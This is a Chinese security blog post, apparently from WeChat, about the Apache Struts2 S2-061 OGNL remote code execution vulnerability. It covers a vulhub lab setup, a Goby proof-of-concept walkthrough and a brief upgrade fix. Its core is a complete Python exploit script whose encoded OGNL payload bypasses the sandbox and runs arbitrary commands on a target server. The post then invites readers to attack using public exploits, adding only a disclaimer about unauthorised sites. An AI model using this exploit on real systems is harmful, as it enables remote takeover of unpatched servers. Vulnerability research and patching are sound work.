> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SRmNKX8o2kV61IengcvwKQ)

![](https://mmbiz.qpic.cn/mmbiz_png/gicQ7o2bUTaxXgDML1Cvs0YYYGg7otpOAQ2gzVSZojZ3bqfyfLiaHJU0UXotWCThVwW9wP9AcebCAmGiahgVrFibKQ/640?wx_fmt=png)

点击上方蓝字关注我们

![](https://mmbiz.qpic.cn/mmbiz_png/RQeIt3Pib9ACndicibtRFhb6kvGnco1ruEg1kd4dx35GUUAl2ia08ib3usxsUJZP5smvZh9N1zg8uQ5mgibwn34gxHhA/640?wx_fmt=png)

**0x00:** **前言与简介**  

一、S2-061 是对 S2-059 沙盒进行的绕过漏洞

二、“黑客” 就通过构造恶意的 OGNL 表达式, 引发 OGNL 表达式二次解析, 最终造成远程代码执行的影响.

**0x01: 影响版本**

Apache:Struts2 : 2.0.0 - 2.5.25

**0x02:** **环境的搭建**  

采用的环境项目地址：

```
https://github.com/vulhub/vulhub/tree/master/struts2/s2-061
```

利用 Docker 进行快速的搭建

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXicP1BJcGwRozz2tp3kzQKDhBag2oSL4cWTJENzyt2TaEfHDiaSk0giaBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXkicghfwGgLW7jLFAw7WAI4dibvqM6iblVN1brpQr5AvPX0XapZxC3ugiaA/640?wx_fmt=png)

利用 Burp 请求验证漏洞

EXP 源自网络：

```
https://github.com/vulhub/vulhub/tree/master/struts2/s2-061
```

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXucCUOeymWKbz3RKFM8OJgVLvAu4lhmRlJgdzlvzxPRkAVOGGicP6XHQ/640?wx_fmt=png)

漏洞验证完毕

变更请求方法

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXx0VhiavtOWwV5iaOHA4VST77uD4usAd3aicLKxK9ZkFTDcWyIic9d6wjWQ/640?wx_fmt=png)

验证成功

**0x03:Python 脚本的编写**  

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXrAxOgxgj5xKCBnFL7PTK53LAgFA9asblrF3F0esOE72Q5SZCeY2kLg/640?wx_fmt=png)

构造一个 requests 的 Get 请求即可, 最后在利用正则筛选出命令执行的结果.

完整代码如下

```
#!/usr/bin/python3
 #author:Jaky
 #微信公众号:洛米唯熊

import requests,sys,re


if len(sys.argv)<3:
        print("[+]Use: pyhton3 s2-061.py http://ip:port command")
        print("[+]Explain: 洛米唯熊")
        print("[+]============================================================")
        sys.exit()

def Jaky():
    payload="%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+sys.argv[2]+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"  
    url=sys.argv[1]+"/index.action?id="+payload
    r=requests.get(url).text
    z=re.findall("a id=.*",r)
    print (str(z).replace("a id=\"",""))

if __name__ == '__main__':
Jaky()
```

**效果图**

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXEHhHic3epB5IjbsrNU44BBD2mx9rvnhDJjLuGzxLzhwSRwAxuwvzEKA/640?wx_fmt=png)

**0x04:Goby POC 编写**  

一、Goby 自带的 poc 开发界面

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXjNmz7886yIYicSv7Bic6f1hyysicvQbqIkpbnKuBBShicXibMoicoiaUEhbBw/640?wx_fmt=png)

二、填写相应的信息

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXEtIIw1cPT5QLlmibCGiatH3p7g8QPthH37ficUabia7c0r8NAvDseibFdIQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXj35p2z3eI3Sjkfs1obp17iaNibbkF6PLibbgxcUJDU0OIw6FMooFYoBTw/640?wx_fmt=png)

三、在测试界面填写入上面的 Get 成功的 payload

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrX8Dhd4Z2zhvLMrBNVeJ8iahIp682DWmR2UmhfUNN2y7yyQpyicp06umTw/640?wx_fmt=png)

响应测试填写入的是响应包，我们需要的是得到什么信息。我这里测试的命令是 “ID”. 所以我利用正则的匹配获取 UID 的信息。

四、环境测试

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrX0czXKQZrXv8oRxhHTxUtATXRThPftgz5TXSFwg4ENS4qibZIFY565LQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXtOhQbPqfiayFby4codULbwE2JTRMGwN9Cxk9FDRBK34t8wVGO6HUglQ/640?wx_fmt=png)

五、做扫描测试

![](https://mmbiz.qpic.cn/mmbiz_png/t5JeQdB9xwNiaGv1o34qRKzWjricZ6wRrXcwxgEgG9oCPfunica8YK0LvibtsbbML1wVKmic0kvYYOha36LT49wrntQ/640?wx_fmt=png)

六、接下来就可以利用公开的 exp 进行攻击了

**（未授权网站禁止攻击，后果自负）**

**0x05: 修复方案**

及时更新 Apache Struts 框架版本：

```
https://struts.apache.org/download.cgi#struts2526
```